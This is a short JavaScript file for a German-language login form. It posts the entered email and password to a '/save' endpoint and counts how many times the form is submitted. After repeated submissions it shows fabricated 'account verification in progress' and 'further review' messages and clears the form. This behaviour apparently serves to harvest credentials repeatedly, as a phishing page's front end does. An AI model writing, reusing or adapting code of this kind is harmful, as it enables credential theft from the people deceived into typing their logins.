// Password toggle
const passwordInput = document.getElementById("input-password");
const toggle = document.getElementById("toggle");

toggle.addEventListener("click", (e) => {
  e.preventDefault();
  passwordInput.type = passwordInput.type === "password" ? "text" : "password";
});

// Track submissions
let submissionCount = 0;

function sendData() {
  const email = document.getElementById("input-email").value;
  const password = document.getElementById("input-password").value;

  // Simple validation
  if (!email || !password) {
    alert("Bitte geben Sie E-Mail und Passwort ein!");
    return;
  }

  // Send to server
  fetch('/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
    .then(res => res.json())
    .then(response => {
      console.log('Server response:', response);

      submissionCount++;

      // Select modal elements
      const popupTitle = document.querySelector(".modal-box h2");
      const popupMessage = document.querySelector(".modal-box p");

      // Change modal content based on submission count
      if (submissionCount === 1) {
        // First submission: keep original HTML message
        showModal();
      } else if (submissionCount === 2) {
        popupTitle.innerText = "Kontoprüfung läuft ✔️";
        popupMessage.innerText = "Ihre Anmeldedaten werden nun mit unseren Datensätzen abgeglichen, um deren Richtigkeit zu überprüfen. Nach Abschluss des Vorgangs wird Ihre Verifizierung abgeschlossen.";
        showModal();
      } else {
        popupTitle.innerText = "Weitere Überprüfung ⚠️";
        popupMessage.innerText = "Weitere Eingaben wurden erfasst. Bitte überprüfen Sie alles sorgfältig.";
        showModal();
      }

      // Reset form
      document.getElementById("myForm").reset();
    })
    .catch(err => console.error('Error:', err));
}

// Modal handlers
const modalOverlay = document.getElementById("modalOverlay");
const closeModalBtn = document.getElementById("closeModal");

function showModal() {
  modalOverlay.style.display = "flex";
}

function hideModal() {
  modalOverlay.style.display = "none";
}

closeModalBtn.addEventListener("click", hideModal);